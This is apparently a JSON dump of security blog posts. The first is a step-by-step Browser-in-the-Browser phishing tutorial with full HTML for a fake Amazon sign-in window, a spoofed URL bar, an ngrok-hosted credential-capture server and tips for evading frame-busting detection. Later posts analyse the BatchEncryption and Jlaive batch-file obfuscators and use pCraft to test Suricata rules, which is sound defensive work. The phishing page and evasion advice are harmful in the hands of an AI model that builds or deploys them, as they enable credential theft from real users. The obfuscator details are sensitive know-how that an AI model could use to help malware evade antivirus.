[{"content":"What is the Browser-in-the-Browser attack BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.\nBasically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.\nHow does it work The way this attack works is that you host a phishing website, provide a login/signup page with usual platforms like \u0026ldquo;Continue with email\u0026rdquo;, \u0026ldquo;Continue with Facebook\u0026rdquo; etc and make the SSO window look legitimate (valid url) but the reality is that we will have control over that window to, because that window is fake as well.\nDemo To start off, we need to go to mr.d0x github page and get the template windows for this attack:\nhttps://github.com/mrd0x/BITB The files are just usual website files (html, css, js, icons). Example of a window before we modify it is the following: In the github repo, there are multiple templates based on the browser and the theme (dark / light). You need to know how the victim has configured his/her browser in order to use the right template so evade suspicions. You can either take a guess based on statistics (what is the most used theme) or write further code in the website to detect the theme and thus use the appropriate theme:\nhttps://stackoverflow.com/questions/50840168/how-to-detect-if-the-os-is-in-dark-mode-in-browsers Now that we have chosen a theme, let\u0026rsquo;s host a phishing website. I will go with blackeye one since I have made a post about it.\nWe first fire up our phishing website. It\u0026rsquo;s going to be an amazon one:\nAfterwards, we need to find the appropriate amazon.svg file and place it in the theme folder we are using. The final html page should be something like the following:\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1\u0026#34;\u0026gt; \u0026lt;link rel=\u0026#34;stylesheet\u0026#34; href=\u0026#34;style.css\u0026#34;\u0026gt; \u0026lt;script src=\u0026#34;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026#34;window\u0026#34;\u0026gt; \u0026lt;!-- Title bar start --\u0026gt; \u0026lt;div id=\u0026#34;title-bar-width\u0026#34;\u0026gt; \u0026lt;div id=\u0026#34;title-bar\u0026#34;\u0026gt; \u0026lt;div style=\u0026#34;margin-top:5px;\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;./amazon.svg\u0026#34; width=\u0026#34;20px\u0026#34; height=\u0026#34;15px\u0026#34; id=\u0026#34;logo\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;logo-description\u0026#34;\u0026gt;Please log to your account.\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div\u0026gt; \u0026lt;span id=\u0026#34;minimize\u0026#34;\u0026gt;\u0026amp;#8212;\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;square\u0026#34;\u0026gt;□\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;exit\u0026#34;\u0026gt;✕\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div id=\u0026#34;url-bar\u0026#34;\u0026gt; \u0026lt;img src=\u0026#34;./ssl.svg\u0026#34; width=\u0026#34;20px\u0026#34; height=\u0026#34;20px\u0026#34; id=\u0026#34;ssl-padlock\u0026#34;\u0026gt; \u0026lt;span id=\u0026#34;domain-name\u0026#34;\u0026gt;https://www.amazon.com\u0026lt;/span\u0026gt; \u0026lt;span id=\u0026#34;domain-path\u0026#34;\u0026gt;/signin.html\u0026lt;/span\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;!-- Content start --\u0026gt; \u0026lt;iframe id=\u0026#34;content\u0026#34; src=\u0026#34;https://44e5-46-177-73-144.ngrok-free.app\u0026#34; frameBorder=\u0026#34;0\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;script src=\u0026#34;script.js\u0026#34;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/html\u0026gt; The victim should now see the following window, which seems legitimate: Upon entering the credentials, we should see them in our server: We could also write code to forward the user to the real login of the website we mimiced and pass the given creds as parameters to avoid further suspicion.\nDefenses The way this attack was initially detected was by trying to drag the SSO window out of the browser window. If the SSO window was not able to escape the outter window, this meant that it was fake.\nLater on, a plugin came out that would identify such windows by the use of their iframes and warn users about this attack. This is done with a technique known as frame busting, a technique now used by most of the known browsers. This leads to BitB being heavily detected and can burn your phishing domain. In order to avoid BitB being detected, you must somehow heavily obfuscate/hide it.\nSo if we somehow managed to solve the defense mechanism that checks for iframes, we would have a successful BitB phishing attack, which brings us to the next section on how to implement this attack without iframes and with the help of evilginx.\nBitB without iframes In this technique, apache and evilginx is utilized alongside with many css and html tricks, avoiding the use of iframes and thus making a more complicated (\u0026ldquo;obfuscated\u0026rdquo;) approach that is not that easy to detect. As the developer of this developed technique stated in his github repo: Framebusters target iframes specifically, so the idea is to create the BITB effect without the use of iframes, and without disrupting the original structure/content of the proxied page. This can be achieved by injecting scripts and HTML besides the original content using search and replace (aka substitutions), then relying completely on HTML/CSS/JS tricks to make the visual effect. We also use an additional trick called \u0026ldquo;Shadow DOM\u0026rdquo; in HTML to place the content of the landing page (background) in such a way that it does not interfere with the proxied content, allowing us to flexibly use any landing page with minor additional JS scripts.\nThe result is a fully working, undetected to framebusters SSO window using the bitb technique:\nThere are many things going on in frameless BitB but Wael Masri does a great job explaining the ins and outs of this technique and how you could replicate it:\nReferences\n[1] Mr.d0x: Browser In The Browser (BITB) Attack [2] Cofense email security: Browser-in-the-Browser (BitB) Attack Takes Advantage of Single-Sign-On Trust [3] Infinite Logins: Browser in the Browser (BITB) Phishing Technique [3] Wael Masri: How To: Evilginx + BITB | Browser In The Browser without iframes in 2024 [4] waelmas: frameless-bitb ","permalink":"http://localhost:1313/posts/bitb/","summary":"What is the Browser-in-the-Browser attack BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.\nBasically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.","title":"Browser-in-the-Browser (BitB) attack"},{"content":"What is the BatchEncryption tool The BatchEncryption tool is a tool used for obfuscating batch files. It is rather one of the most uncommon ones since it combines known and custom environment variable encodings to obfuscate the script. The way it works is it sets a randomly generated dictionary into a custom envar which is just a single quote (\u0026quot;\u0026rsquo;\u0026quot;). It then encodes it with existing environment variable substrings and then takes the remainder of the command using substrings of the custom environment variable declared previously.\nThe use of this tool was seen back in 2017 in the Jawlan and Suriya.doc (SHA-256: 761483906b45fad51f3c7ab66b1534dee137e93a52816aa270bc97249acb56d0) and has almost unknown at the time, with only 3 google search results.

Anyways, we can see that indeed a lot of stuff is going on. Custom, existing envars, caret symbol for extra obfuscation etc. We also notice a header on top, which is the author of the program (gwsbhqt@163.com). Let\u0026rsquo;s load it to VT and watch what happens:\nWe successfully reduced our results to only 3! For any of you wondering what would happen if we had removed the header of the author and load it again, it would give the same results.\nLet\u0026rsquo;s now see how we can deobfuscate samples obfuscated with this technique.\nBatch-Encryption-DeCoder Luckily for us, there is already a tool for this purpose, which can be found here:\nhttps://github.com/cnHopeStudio/Batch-Encryption-DeCoder We need to build this tool to get the final executable, which when run, gives us the original batch file:\nReferences\n[1] blackhat: Exploring the Depths\rof Cmd.exe Obfuscation and Detection Techniques\r[2] Amit: Recipient batch processing documents confused by BatchEncryption (version 201610)\r[3] gwsbhqt: [Original Tool][201610]BatchEncryption-BatchEncrying Encryption\r","permalink":"http://localhost:1313/posts/batchencryption/","summary":"What is the BatchEncryption tool The BatchEncryption tool is a tool used for obfuscating batch files.

This will just be an overview of the tools: How to obfuscate an executable with Jlaive and how to recover it using Get-UnJlaive.\nWhat is the Jlaive tool In short terms, Jlaive is a tool used to convert executables to undetectable .bat scripts for AV evasion. This tool is very similar to the well known BatCloak engine which was used to create such undetectable .bat scripts. As the scmagazine states \u0026hellip;Researchers tie BatCloak closely to another, now abandoned, BAT obfuscation tool called Jlaive\u0026hellip;Trend Micro said that the BatCloak engine is the core engine of Jlaive’s obfuscation algorithm, now repurposed. The BatCloak functionality is specifically tied to the instructions “LineObfuscation.cs and FileObfuscation.cs” used in the Jlaive crimeware.\nThere are many tools with similar goals, like the ScrubCrypt, but they are closed-source for better monetization and avoide the use of them from other cyber criminal groups. Anyway, lucky for us, we got a hold of the Jlaive tool and we are going to explore it in a simple poc executable.\nSimple poc The poc is nothing more than a MsgBox:\nusing System; using System.Collections.Generic;

He gives an overview of what calls are being made when we execute this obfuscated .bat file and also a poc of rules to detect such malicious files (although, they could be bypassed).\nRunning this batch script gives the same output as our original executable:\nAfter we run this, the .bat file gets deleted - well, its contents gets deleted - and a new file, with an .exe extension appears to have been created:\nThis is where the tool Get-UnJlaive will come into play, which will take advantage of this and manage to deobfuscate the script and give the original .exe code.\nGet-UnJlaive Now onto the deobfuscation part. Get-UnJlaive is a tool able to reconstruct Jlaive (.NET Antivirus Evasion Tool (Exe2Bat)) to original Assembly and stub Assembly, as the author states. We are going to use his tool which can be found in the following repo (also has an amazing channel which I will leave in the references):\nhttps://github.com/Dump-GUY/Get-UnJlaive Basically what this tool does is to run the .bat file, set it in a suspended state to get the deobfuscated form (as we previously saw, a .exe was created after we had run the .bat), decrypt it, reconstruct the original assembly and then terminates it. For an indepth analysis of how this tool works, you can watch the video of dumpguy which I\u0026rsquo;ll leave in the references.\nReconstructing the original assembly The tool is easy to set. You simple just open a powershell terminal, load the module provided and you are good to go. After you run the tool, you should get a file with an extension \u0026ldquo;.bat_orig.exe\u0026rdquo; which you could load into DnSpy for example and view its code: Aaand we have successfully reconstructed our original .exe from the obfuscated batch file!\nReferences\n[1] scmagazine: Obfuscation tool ‘BatCloak’ evades 80% of AV engines\r[2] Jose Luis Sánchez Martínez: Using Jlaive to create batch files from .NET assemblies for defense evasion\r[3] Dump-GUY: Get-UnJlaive\r[3] DuMp-GuY TrIcKsTeR: Get-UnJlaive - Jlaive Protector Reconstructor\r","permalink":"http://localhost:1313/posts/jlaive/","summary":"What will this post be about This post will be about the Jlaive and Get-UnJlaive tools.

The generated pcap file can then be used for the testing of rules etc.\nInstallation To install the tool, you can either clone it from its github repo:\nhttps://github.com/DevoInc/pCraft or by using docker.\nI had some issues when running the tool from the github repo (dependency errors with the pyami module), so I went with the docker option instead, which is what I will demonstrate.\nIn summary, we need to run the following commands:\n{ \u0026#34;1) systemctl start docker\u0026#34;:\u0026#34;Starts docker\u0026#34;, \u0026#34;2) sudo docker pull sightingdb/pcraft\u0026#34;:\u0026#34;Pulls the docker image of the tool\u0026#34;, \u0026#34;3) docker run --name pcraft -d sightingdb/pcraft\u0026#34;:\u0026#34;Runs the tool\u0026#34;, \u0026#34;4) docker ps -a\u0026#34;:\u0026#34;Finds the ID of the docker process running the tool\u0026#34;, \u0026#34;5) docker exec -it {ID} bash\u0026#34;:\u0026#34;Executes the container in bash (meaning we get a shell inside the docker container)\u0026#34; } After that, we should be inside the docker container and run the tool without any errors:\nbuilder@4079f88d957d:~/pcraft$ ls \u0026#39;#hello.ami#\u0026#39; ami dns.ami parsuricata pyami.cpython-38-x86_64-linux-gnu.so setup.py LICENSE amigraph.py dns.pcap pcraft requirements.txt tests README.md build-pluginsdoc.py doc pcrafter samples tools builder@4079f88d957d:~/pcraft$ ./pcrafter Syntax: ./pcrafter script.ami output.pcap script.ami The .ami file contains actions that will be triggered and displayed inside the generated .pcap file. These actions can contain anything you see on a network traffic, like DNS queries, data being transfered, TCP handshakes etc.\nExample of an ami file An example of a .ami file is the following:\nami_version 1\r$victimip = \u0026#34;192.168.0.55\u0026#34;\r$fakebankip = \u0026#34;185.199.108.153\u0026#34;\raction DnsRequest {\r$ip-src = $victimip\r$ip-dst = $fakebankip\r$domain = \u0026#34;mikrosoft.com\u0026#34;\rexec DNSConnection\r}\raction PostData {\rexec HTTPConnection\r$method = \u0026#34;POST\u0026#34;\r$client-content-type = \u0026#34;application/x-www-form-urlencoded\u0026#34;\r$client-content = \u0026#34;login=Alfred.Wallace@example.com\u0026amp;password=qwerty1234\u0026#34;\r} This will basically trigger a DNS request and the resolved domain will be \u0026ldquo;mikrosoft.com\u0026rdquo; (you could set up a rule to detect such names later as we will see).\nAfterwards, we specify that a PostData action will take place which basically transfers some data - and specifically some user credentials.\nGenerating a pcap file based on an ami scenario Let\u0026rsquo;s see that in action:\nbuilder@4079f88d957d:~/pcraft$ ./pcrafter dns.ami dns.pcap All plugins loaded!

In this part of the post, we are going to follow up on the example of the Red Team Village (see references) and create our own suricata rule, ami file and then generate a pcap and use tcpreplay to test if our rule is successful upon the generated custom network file.\nCreate the ami file (newsuricata.ami) The ami file we will use is the following:\nami_version 1\raction TriggerSuricata {\rexec Suricata\r$ip-src = \u0026#34;172.17.0.2\u0026#34;\r$ip-dst = \u0026#34;185.199.108.153\u0026#34;\r$rule = \u0026#34;\u0026#34;\u0026#34;alert dns any any -\u0026gt; any any (msg:\u0026#34;DNS Query GrayHat\u0026#34;; dns_query; content:\u0026#34;grayhat\u0026#34;; nocase; sid:20200809; rev:1;)\u0026#34;\u0026#34;\u0026#34;\r} Just a note here, we see that we exec Suricata. This file contains a domain called \u0026ldquo;GrayHat\u0026rdquo; as we will later see, so it uses this name as the $domain variable.\nCreate the Suricata rule (mydns.rule) The Suricata rule is a very simple one:\nalert dns any any -\u0026gt; any any (msg:\u0026#34;DNS Query Grayhat\u0026#34;; dns_query; content:\u0026#34;grayhat\u0026#34;; nocase; sid:20201020; rev:1;) It basically listens on all interfaces to find a dns query that contains the domain name \u0026ldquo;Grayhat\u0026rdquo;.\nTesting our rule Now that we have both the ami and the rule files ready, let\u0026rsquo;s generate the pcap file like we\u0026rsquo;ve seen previously:\nbuilder@4079f88d957d:~/pcraft$ ./pcrafter newsuricata.ami new.pcap The generated pcap is just a pcap that makes dns queries for the domain \u0026ldquo;Grayhat\u0026rdquo;:\nbuilder@4079f88d957d:~/pcraft$ tshark -r new.pcap 1 0.000000 172.17.0.2 ? 1.1.1.1 DNS 67 Standard query 0x0000 A grayhat 2 0.000409 1.1.1.1 ? 172.17.0.2 DNS 90 Standard query response 0x0000 A grayhat A 185.199.108.153 Now that we have a successfully generated pcap, let\u0026rsquo;s set up a listener with suricata (note that you must run the following as root user):\nroot@4079f88d957d:/home/builder/pcraft# suricata -S mydns.rule -i eth0 17/3/2024 -- 15:22:28 - \u0026lt;Notice\u0026gt; - This is Suricata version 5.0.3 RELEASE running in SYSTEM mode 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Warning\u0026gt; - [ERRCODE: SC_ERR_SYSCALL(50)] - Failure when trying to set feature via ioctl for \u0026#39;eth0\u0026#39;: Operation not permitted (1) 17/3/2024 -- 15:22:28 - \u0026lt;Notice\u0026gt; - all 5 packet processing threads, 4 management threads initialized, engine started Then, we can just use tcpreplay with our previously generated pcap to replicate the traffic:\nbuilder@4079f88d957d:~/pcraft$ tcpreplay -i eth0 new.pcap Warning in interface.c:get_interface_list() line 93: May need to run as root to get access to all network interfaces.
